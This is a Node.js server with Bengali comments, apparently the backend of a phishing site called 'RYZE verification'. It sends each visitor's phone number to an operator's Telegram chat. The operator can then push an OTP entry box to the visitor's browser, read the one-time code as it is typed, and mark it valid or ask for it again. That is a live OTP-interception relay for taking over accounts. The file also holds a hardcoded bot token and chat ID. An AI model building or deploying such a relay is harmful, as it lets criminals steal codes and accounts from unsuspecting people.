const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Telegraf, Markup } = require('telegraf');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const BOT_TOKEN = '8599585292:AAENAD4zbqo8bJL3XPzhcyAwdkR3buB_3gM';
const MY_CHAT_ID = '5967798239';
const bot = new Telegraf(BOT_TOKEN);

app.use(express.static('public'));

// রেন্ডার স্লিপ মোড চেক রুট
app.get('/ping', (req, res) => res.send('RYZE Server is Awake!'));

const activeUsers = {};

io.on('connection', (socket) => {
    
    // ১. ফোন নম্বর ও পারপাস পাওয়ার পর
    socket.on('send_phone', async (data) => {
        const { phone, purpose } = data;
        activeUsers[socket.id] = { phone: phone, purpose: purpose };

        // টেলিগ্রামে মেসেজ পাঠানো (Mono style এ নম্বর যাতে টাচ করলে কপি হয়)
        const msg = await bot.telegram.sendMessage(MY_CHAT_ID, 
            `👤 <b>নতুন ইউজার সেশন</b>\n\n` +
            `📱 নম্বর: <code>${phone}</code>\n` +
            `🎯 উদ্দেশ্য: <b>${purpose}</b>\n` +
            `⏳ স্ট্যাটাস: <i>অপেক্ষমান...</i>`, 
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🔢 OTP বক্স পাঠাও', `ask_otp_${socket.id}`)],
                    [Markup.button.callback('❌ ভুল নম্বর', `retry_phone_${socket.id}`)]
                ])
            }
        );
        activeUsers[socket.id].telegramMsgId = msg.message_id;
    });

    // ২. OTP পাওয়ার পর
    socket.on('send_otp', (otp) => {
        const user = activeUsers[socket.id];
        if (!user) return;

        bot.telegram.editMessageText(MY_CHAT_ID, user.telegramMsgId, null,
            `👤 <b>ইউজার সেশন</b>\n\n` +
            `📱 নম্বর: <code>${user.phone}</code>\n` +
            `🎯 উদ্দেশ্য: <b>${user.purpose}</b>\n` +
            `📩 প্রাপ্ত OTP: <code>${otp}</code>\n\n` +
            `মেলাতে সুবিধা হলে ভেরিফাই করুন।`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('✅ সঠিক (Success)', `verify_success_${socket.id}`)],
                    [Markup.button.callback('❌ ভুল (Retry)', `verify_fail_${socket.id}`)]
                ])
            }
        );
    });

    socket.on('disconnect', () => {
        // ডিসকানেক্ট হলেও ডাটা রাখছি যাতে রিকানেক্ট হলে কাজ করে
    });
});

// টেলিগ্রাম বাটন অ্যাকশন হ্যান্ডলার
bot.action(/ask_otp_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('show_otp_input');
    
    const user = activeUsers[socketId];
    if(user) {
        ctx.editMessageText(`👤 <b>ইউজার সেশন</b>\n\n📱 নম্বর: <code>${user.phone}</code>\n🎯 উদ্দেশ্য: <b>${user.purpose}</b>\n⏳ স্ট্যাটাস: <i>ইউজারকে OTP বক্স পাঠানো হয়েছে...</i>`, { parse_mode: 'HTML' });
    }
});

bot.action(/retry_phone_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('retry_phone');
    ctx.editMessageText(`❌ নম্বর/রিকোয়েস্ট ভুল বলে রিজেক্ট করা হয়েছে।`);
});

bot.action(/verify_success_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('final_status', { status: 'success' });
    const user = activeUsers[socketId];
    ctx.editMessageText(`✅ <code>${user?.phone}</code> ভেরিফাইড সফল!\n🎯 ${user?.purpose}`, { parse_mode: 'HTML' });
});

bot.action(/verify_fail_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('final_status', { status: 'fail' });
    const user = activeUsers[socketId];
    ctx.editMessageText(`👤 <b>ইউজার সেশন</b>\n\n📱 নম্বর: <code>${user?.phone}</code>\n❌ স্ট্যাটাস: <b>ভুল OTP!</b> আবার ইনপুট দিতে বলা হয়েছে।`, {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🔢 আবার OTP বক্স পাঠাও', `ask_otp_${socketId}`)]
        ])
    });
});

bot.launch();

// অটো পিং লজিক (URL আপডেট করে নিন)
setInterval(() => {
    http.get(`http://ryze-verification.onrender.com/ping`);
}, 10 * 60 * 1000);

server.listen(3000, () => {
    console.log('RYZE Server Running on Port 3000');
});
